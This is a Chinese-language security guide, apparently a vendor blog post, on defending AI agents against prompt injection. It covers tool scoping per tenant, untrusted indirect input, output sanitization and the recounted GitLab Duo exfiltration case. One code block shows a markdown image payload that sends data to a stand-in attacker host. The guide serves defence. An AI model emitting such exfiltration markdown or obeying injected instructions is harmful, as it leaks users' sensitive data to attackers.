AI Agent（智能体）是一个带有系统提示词和一组工具的语言模型。工具通过增加对API、文件系统和外部服务的访问来扩展模型的能力，但同时也为出错创造了新的途径。

最关键的安全风险是提示词注入。与SQL注入类似，它允许攻击者将指令混入看似正常的输入中。不同之处在于，对于LLM（大语言模型），没有标准的方法来隔离或转义输入。模型看到的任何内容，包括用户输入、搜索结果或检索到的文档，都可能覆盖系统提示词，甚至触发工具调用。

如果你正在构建一个Agent（智能体），你必须为最坏情况设计。模型会看到攻击者能控制的一切内容，并且它可能会完全按照攻击者的意图行事。

## 链接到标题假设完全被攻破

在设计安全的AI Agent（智能体）时，假设攻击者控制着整个提示词。这包括原始查询、任何用户输入、从工具中检索到的任何数据，以及传递给模型的任何中间内容。

问问自己：如果模型完全按照攻击者写的内容运行，它能做什么？如果答案是不可接受的，那么模型就不应该拥有该能力。

工具的作用范围必须限定在调用者的权限之内。不要给模型任何用户本身无法执行的操作权限。

例如，这个工具是不安全的：

```
1function getAnalyticsDataTool(tenantId, startTime, endTime) …
```

如果模型可以设置`tenantId`，它就能跨租户访问数据。这就是数据泄露。

相反，应该在创建工具时限定其作用范围：

```
1const getAnalyticsDataTool = originalTool.bind(tenantId);
```

现在`tenantId`是固定的。模型可以查询分析数据，但仅限于正确的租户。

## 链接到标题提示词注入是一个数据问题

适当的授权和限定作用范围的工具至关重要，但并非总是足够。即使调用Agent（智能体）的人是可信的，他们传递给模型的数据也可能不可信。

提示词注入通常源于间接输入，例如从数据库检索的内容、从网页抓取的内容或由搜索API返回的内容。如果攻击者控制了这些数据的任何部分，他们可能无需直接与系统交互，就能将指令注入到Agent（智能体）的提示词中。

隔离是唯一可靠的防御措施。验证数据的来源，但要按照每个输入都已被攻破来设计。

## 链接到标题通过模型输出进行数据窃取

即使模型无法直接发起网络请求，攻击者仍然可以通过其他方式提取数据。

例如，如果你的前端将模型输出渲染为markdown，攻击者可以注入如下内容：

```
1![payload](https://attacker.com/leak?data=123)
```

当这个图片渲染时，浏览器会发送一个请求。如果模型能访问敏感数据并将其包含在URL中，那么这些数据就会成为你从未意图发出的出站请求的一部分。

最近GitLab Duo就发生了这样一个利用此漏洞的例子。攻击者在他们控制的文件中添加了markdown。Agent（智能体）读取了该文件，处理了注入的提示词，并返回了一个包含恶意图片URL的输出。该图片随后在浏览器中被渲染，触发了数据窃取。

为了防御此类攻击，在渲染模型输出或将其传递给其他系统之前，应对其进行清理。CSP规则可以提供额外的纵深防御来抵御基于浏览器的数据窃取，尽管这些规则可能难以一致地应用。

对于react-markdown的用户，我们发布了一个名为`harden-react-markdown`的“配套包”，它为链接和图片提供了安全默认设置，并允许对图片进行简单的白名单管理。对于更通用的markdown清理，我们发布了`markdown-to-markdown-sanitizer`，旨在将markdown发布给外部方，如GitHub或GitLab。

## 链接到标题为失败而设计

提示词注入不是一个边缘情况或某种罕见的错误。它是使用语言模型时正常的一部分。

你无法保证用户输入与系统提示词之间的隔离。你不能指望模型总是遵守规则。你能做的是限制其后果。

- 严格将工具的作用范围限定在用户或租户
- 默认将模型输出视为不可信
- 避免直接渲染markdown或HTML。如果适用，请使用`harden-react-markdown`。
- 切勿在提示词中包含密钥或Token

安全不在于信任模型，而在于当模型行为不当时将损害降到最低。
